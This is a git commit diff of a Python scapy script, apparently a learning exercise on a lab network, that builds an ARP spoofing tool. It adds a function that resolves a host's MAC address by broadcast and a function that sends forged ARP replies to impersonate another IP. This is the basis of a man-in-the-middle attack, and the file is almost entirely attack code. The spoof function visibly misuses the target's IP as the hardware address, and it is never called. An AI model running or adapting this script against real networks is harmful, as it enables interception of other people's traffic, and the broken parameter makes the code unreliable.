14408d7f258ee1d78777e8ebe0b3c2bc8e1fe7c4
nicbatten <48190415+nicbatten@users.noreply.github.com>
2019-08-10 14:06:52 -0400

    extracting MAC address from response

--- arp_spoof.py
+++ arp_spoof.py
@@ -2,8 +2,20 @@
 
 import scapy.all as scapy
 
-#op=2 is a arp reqponse and not a request
-packet = scapy.ARP(op=2, pdst="10.0.2.4", hwdst="08:00:27:33:26:01", psrc="10.0.2.1")
-#print(packet.show())
-#print(packet.summary())
-scapy.send(packet)
+def get_mac(ip):
+    arp_request = scapy.ARP(pdst=ip)
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_request_broadcast = broadcast/arp_request
+    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+
+    return answered_list[0][1].hwsrc
+
+def spoof(target_ip, spoof_ip):
+    #op=2 is a arp reqponse and not a request
+    target_mac = get_mac(target_ip)
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_ip, psrc=spoof_ip)
+    #print(packet.show())
+    #print(packet.summary())
+    scapy.send(packet)
+
+get_mac("10.0.2.1")
